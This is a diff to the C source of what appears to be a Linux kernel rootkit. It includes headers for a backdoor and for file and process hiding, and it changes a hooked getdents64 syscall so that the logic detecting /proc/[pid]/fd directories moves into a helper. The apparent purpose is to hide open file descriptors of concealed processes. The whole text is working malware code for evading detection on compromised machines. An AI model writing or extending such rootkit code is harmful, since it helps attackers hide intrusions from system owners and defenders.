@@ -17,11 +17,10 @@
 #include "filehide.h"
 #include "backdoor.h"
 #include "hidepid.h"
+#include "hideopen.h"
 #include "read.h"
 
 extern rootkit_t rootkit;
-
-const char *dir_sep = "/";
 
 void **sys_calls;
 
@@ -204,7 +203,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
     dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
     long ret = sys_getdents64(pt_regs);
 
-    bool may_fd = 0; //We only need /proc/[pid]/fd dirs
+    bool is_fd = 0; //We only need /proc/[pid]/fd dirs
     struct file *dirfile = fget(fd);
     pid_t fd_pid;
 
@@ -214,45 +213,8 @@ g7_getdents64(const struct pt_regs *pt_regs)
     if (copy_from_user(kdirent, dirent, ret))
         goto yield;
 
-    if(dirfile && !strcmp(dirfile->f_path.dentry->d_name.name, "fd")) {
-        char *buf = kzalloc(512, GFP_KERNEL);
-        char *path = d_path(&dirfile->f_path, buf, 512);
-
-        if(!IS_ERR(path)) {
-            char *sub;
-            char *cur = path;
-
-            /**
-             * In the correct directory, the tokens are as follows:
-             * {NULL, proc, [PID], fd}
-             * We also don't want the task directory, so the third
-             * token should be fd, not task
-             **/
-            int i = 0;
-
-            while((sub = strsep(&cur, dir_sep))) {
-                switch(i++) {
-                    case 1:
-                        if(strcmp(sub, "proc"))
-                            goto leave;
-                        break;
-                    case 2:
-                        fd_pid = PID_FROM_NAME(sub);
-                        break;
-                    case 3:
-                        if(!strcmp(sub, "fd"))
-                            may_fd = 1;
-                        else
-                            goto leave;
-                    default:
-                        break;
-                }
-            }
-
-            leave:
-            kfree(buf);
-        }
-    }
+    if((fd_pid = may_fd(dirfile)) != -1)
+        is_fd = 1;
 
     atomic_inc(&getdents64_count);
 
